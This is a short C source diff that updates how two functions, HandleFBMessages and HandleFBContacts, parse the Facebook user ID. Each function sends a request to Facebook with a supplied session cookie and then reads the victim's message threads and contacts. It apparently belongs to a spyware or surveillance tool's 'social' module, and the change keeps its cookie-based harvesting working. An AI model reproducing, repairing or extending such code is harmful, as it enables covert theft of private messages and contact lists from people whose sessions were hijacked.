@@ -6,6 +6,9 @@
 #include "SocialMain.h"
 #include "NetworkHandler.h"
 
+//#define FB_USER_ID "\"user\":\""
+#define FB_USER_ID "\"id\":\""
+
 #define FB_THREAD_LIST_ID "\"threads\":[{"
 #define FB_THREAD_LIST_END "\"ordered_threadlists\":"
 
@@ -154,12 +157,12 @@ DWORD HandleFBMessages(char *cookie)
 	ret_val = HttpSocialRequest(L"www.facebook.com", L"GET", L"/home.php?", 443, NULL, 0, &r_buffer, &response_len, cookie);	
 	if (ret_val != SOCIAL_REQUEST_SUCCESS)
 		return ret_val;
-	parser1 = (BYTE *)strstr((char *)r_buffer, "\"user\":\"");
+	parser1 = (BYTE *)strstr((char *)r_buffer, FB_USER_ID);
 	if (!parser1) {
 		SAFE_FREE(r_buffer);
 		return SOCIAL_REQUEST_BAD_COOKIE;
 	}
-	parser1 += strlen("\"user\":\"");
+	parser1 += strlen(FB_USER_ID);
 	parser2 = (BYTE *)strchr((char *)parser1, '\"');
 	if (!parser2) {
 		SAFE_FREE(r_buffer);
@@ -486,12 +489,12 @@ DWORD HandleFBContacts(char *cookie)
 	ret_val = HttpSocialRequest(L"www.facebook.com", L"GET", L"/home.php?", 443, NULL, 0, &r_buffer, &response_len, cookie);	
 	if (ret_val != SOCIAL_REQUEST_SUCCESS)
 		return ret_val;
-	parser1 = strstr((char *)r_buffer, "\"user\":\"");
+	parser1 = strstr((char *)r_buffer, FB_USER_ID);
 	if (!parser1) {
 		SAFE_FREE(r_buffer);
 		return SOCIAL_REQUEST_BAD_COOKIE;
 	}
-	parser1 += strlen("\"user\":\"");
+	parser1 += strlen(FB_USER_ID);
 	parser2 = strchr(parser1, '\"');
 	if (!parser2) {
 		SAFE_FREE(r_buffer);
